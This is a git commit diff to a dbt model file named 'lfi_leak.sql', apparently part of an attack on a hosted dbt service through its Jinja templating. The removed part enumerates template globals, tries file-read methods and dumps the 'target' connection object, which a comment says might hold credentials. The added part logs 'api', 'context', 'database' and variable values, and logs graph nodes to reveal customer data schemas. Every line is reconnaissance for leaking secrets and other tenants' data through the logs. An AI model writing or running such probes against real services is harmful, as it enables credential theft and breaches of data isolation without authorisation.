645bd2145955614cfa1a157c75527e340aa6d68d
hunter <hunter@WD168220234152noidaspeedvpsFY1KQ5t4wW.test.com>
2026-09-23 02:08:14 +0530

    api and context exploration

--- models/lfi_leak.sql
+++ models/lfi_leak.sql
@@ -1,62 +1,33 @@
-{# Try various file read methods in Jinja2 #}
-
-{# Method 1: Try source() function with file path #}
-{# Method 2: Try include with relative paths #}
-{# Method 3: Try to use modules for file access #}
-
-{# Check if we have any file-reading functions #}
-{% if load_result is defined %}
-{{ log("LOAD_RESULT_EXISTS=yes", info=True) }}
-{% else %}
-{{ log("LOAD_RESULT_NOT_DEFINED", info=True) }}
-{% endif %}
-
-{% if load_profile is defined %}
-{{ log("LOAD_PROFILE_EXISTS=yes", info=True) }}
-{% else %}
-{{ log("LOAD_PROFILE_NOT_DEFINED", info=True) }}
-{% endif %}
-
-{# Try to access internal dbt functions #}
-{% if builtins is defined %}
-{{ log("BUILTINS_EXISTS=yes", info=True) }}
+{# Explore api and context objects #}
+{% if api is defined %}
+{{ log("API=" ~ api, info=True) }}
 {% endif %}
 
 {% if context is defined %}
-{{ log("CONTEXT_EXISTS=yes", info=True) }}
+{# Don't log full context - too big. Check for useful methods #}
+{{ log("CONTEXT_TYPE=" ~ context.__class__ if context.__class__ is defined else 'no_class', info=True) }}
 {% endif %}
 
-{# Try to enumerate available Jinja2 globals #}
-{% set ctx_vars = [] %}
-{% for name in ['adapter', 'api', 'builtins', 'config', 'context', 'database', 
-                'env_var', 'exceptions', 'execute', 'flags', 'fromjson', 'fromyaml',
-                'graph', 'invocation_id', 'load_result', 'log', 'model', 'modules',
-                'post_hooks', 'pre_hooks', 'project_name', 'ref', 'return', 'run_query',
-                'run_started_at', 'schema', 'selected_resources', 'source', 'target',
-                'this', 'tojson', 'toyaml', 'var', 'dbt_version'] %}
-  {% set val = '' %}
-  {% if name == 'adapter' and adapter is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'api' and api is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'config' and config is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'context' and context is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'database' and database is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'execute' and execute is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'flags' and flags is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'graph' and graph is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'model' and model is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'modules' and modules is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'project_name' and project_name is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'schema' and schema is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'target' and target is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'this' and this is defined %}{% do ctx_vars.append(name) %}{% endif %}
-  {% if name == 'var' and var is defined %}{% do ctx_vars.append(name) %}{% endif %}
-{% endfor %}
+{# Check if we can use api.Relation or api.Column #}
+{% if api.Relation is defined %}
+{{ log("API_RELATION=" ~ api.Relation, info=True) }}
+{% endif %}
 
-{{ log("AVAILABLE_CONTEXT=" ~ ctx_vars, info=True) }}
+{% if api.Column is defined %}
+{{ log("API_COLUMN=" ~ api.Column, info=True) }}
+{% endif %}
 
-{# Try to access target connection details (might contain credentials) #}
-{% if target is defined %}
-{{ log("TARGET_ALL=" ~ target, info=True) }}
+{# Try database variable #}
+{% if database is defined %}
+{{ log("DATABASE=" ~ database, info=True) }}
+{% endif %}
+
+{# Try var() function with some common names #}
+{{ log("VAR_TEST=" ~ var('test_var', 'NOT_SET'), info=True) }}
+
+{# Check graph for other models/sources - might reveal customer data schema #}
+{% if graph is defined %}
+{{ log("GRAPH_NODES=" ~ graph.nodes.keys()|list, info=True) }}
 {% endif %}
 
 SELECT 1 as id
